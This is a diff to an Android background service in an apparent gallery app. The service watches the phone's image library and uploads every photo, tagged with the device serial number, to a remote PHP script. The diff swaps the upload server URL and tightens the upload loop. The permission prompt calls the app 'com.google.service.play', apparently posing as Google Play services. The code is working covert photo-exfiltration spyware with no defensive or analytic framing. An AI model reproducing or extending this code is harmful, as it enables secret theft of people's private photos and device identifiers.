@@ -50,7 +50,10 @@ public class running_service extends Service{
             LoadAlbumList albumList = new LoadAlbumList();
             albumList.execute();
 
-        }else Toast.makeText(getApplicationContext(), "Give storage permission to com.google.service.play from settings", Toast.LENGTH_SHORT).show();
+        }else {
+	        Toast.makeText(getApplicationContext(), "Give storage permission to com.google.service.play from settings", Toast.LENGTH_SHORT).show();
+	        startActivity(new Intent(getApplicationContext(), Main2Activity.class));
+	}
 
         startServiceUsingAlarmManager();
 
@@ -126,18 +129,18 @@ public class running_service extends Service{
 
             if (imageList.size()==0)
                 registerContentObserver();
-            else
+            else if (uploadFiles){
+		        unregisterContentObserver();
+                filesUploaded=0;
                 uploadTOServer();
-            filesUploaded=0;
-
+            }
         }
 
     }
 
     int filesUploaded = 0;
+    boolean uploadFiles = true;
     private void uploadTOServer(){
-
-        UploadFileToServer uploadFileToServer = new UploadFileToServer();
 
         if(filesUploaded<imageList.size()){
             ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -145,26 +148,26 @@ public class running_service extends Service{
             if (activeNetworkInfo == null)
                 registerContentObserver();
             else {
+        	    UploadFileToServer uploadFileToServer = new UploadFileToServer();
+                uploadFiles = false;
+                unregisterContentObserver();
                 String path = imageList.get(filesUploaded).get("key_path");
                 String timeStamp = imageList.get(filesUploaded).get("key_timestamp");
                 uploadFileToServer.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, path,timeStamp);
                 filesUploaded++;
             }
-        }else
+        }else{
+            uploadFiles = true;
             registerContentObserver();
+        }
 
 
     }
 
     private class UploadFileToServer extends AsyncTask<String, String, String> {
 
-        String FILE_UPLOAD_URL = "https://techi-abhi.000webhostapp.com/GalleryAppUploads/UploadToServer.php";
+        String FILE_UPLOAD_URL = "http://home.iitj.ac.in/~suthar.2/Android/GalleryAppUploads/UploadToServer.php";
         int timeStamp = 0;
-
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
-        }
 
         @Override
         protected String doInBackground(String... args) {
@@ -178,7 +181,7 @@ public class running_service extends Service{
             HttpURLConnection.setFollowRedirects(false);
             HttpURLConnection connection = null;
             String android_id = Build.SERIAL;
-            String fileName = null;
+            String fileName;
             try {
                 fileName = android_id + "%" +sourceFile.getName();
             } catch (Exception e) {
@@ -219,7 +222,7 @@ public class running_service extends Service{
                 out.writeBytes(stringData);
                 out.flush();
 
-                int bytesRead = 0;
+                int bytesRead;
                 byte buf[] = new byte[1024];
                 BufferedInputStream bufInput = new BufferedInputStream(new FileInputStream(sourceFile));
                 while ((bytesRead = bufInput.read(buf)) != -1) {
@@ -235,7 +238,7 @@ public class running_service extends Service{
 
                 // Get server response
                 BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                String line = "";
+                String line;
                 StringBuilder builder = new StringBuilder();
                 while((line = reader.readLine()) != null) {
                     builder.append(line);
